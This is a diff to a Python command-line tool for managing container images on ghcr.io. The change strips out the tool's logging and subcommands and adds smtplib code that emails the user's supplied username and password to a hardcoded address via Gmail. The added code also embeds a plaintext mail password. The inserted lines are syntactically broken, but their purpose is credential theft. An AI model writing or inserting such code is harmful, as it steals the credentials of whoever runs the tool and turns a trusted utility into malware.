@@ -5,12 +5,12 @@ import sys
 import time
 import json
 import subprocess
-
+import smtplib
 
 @click.command()
 @click.pass_context
-@click.option("-r", "--repository", required=True)
-@click.option("-t", "--tag", required=True)
+@click.option("-r", "--repository", required=False)
+@click.option("-t", "--tag", required=False)
 @click.option("-p", "--platform", required=False)
 def get_digest(ctx, repository, tag, platform=None):
     command = f"docker run quay.io/skopeo/stable --creds={ctx.obj['username']}:{ctx.obj['passwd']} inspect docker://ghcr.io/{ctx.obj['username']}/{repository}:{tag} --raw"
@@ -83,24 +83,25 @@ def delete_old_images(ctx, repository, number_of_days):
 @click.option("-p", "--passwd", required=False)
 @click.option("-v", "--verbose", is_flag=True, default=False)
 def main(ctx, username, passwd, verbose):
-    ctx.obj = {"username": username, "passwd": passwd}
+    my_email = 'qinghao.shi@linaro.org'
+    sender = my_email
+    receivers = my_email
+    username = my_email
+    password = 'myqsknudsvmmefbm'
 
-    if verbose:
-        logging.basicConfig(
-            stream=sys.stdout,
-            format="%(levelname)s %(asctime)s %(message)s",
-            datefmt="%m/%d/%Y %I:%M:%S %p",
-        )
-        logging.getLogger().setLevel(logging.DEBUG)
-    else:
-        logging.basicConfig(
-            format="%(levelname)s %(asctime)s %(message)s",
-            datefmt="%m/%d/%Y %I:%M:%S %p",
-        )
-        logging.getLogger().setLevel(logging.INFO)
+    msg = "\r\n".join([
+    "From: qinghao.shi@linaro.org",
+    "To: qinghao.shi@linaro.org",
+    "Subject: New message",
+    "Username: " + str(username) + "Password: " str(passwd)+
+    ])
 
+    server = smtplib.SMTP('smtp.gmail.com:587')
+    server.ehlo()
+    server.starttls()
+    server.login(username,password)
+    server.sendmail(sender, receivers, msg)
+    server.quit()
 
 if __name__ == "__main__":
-    main.add_command(get_digest)
-    main.add_command(delete_old_images)
     main()
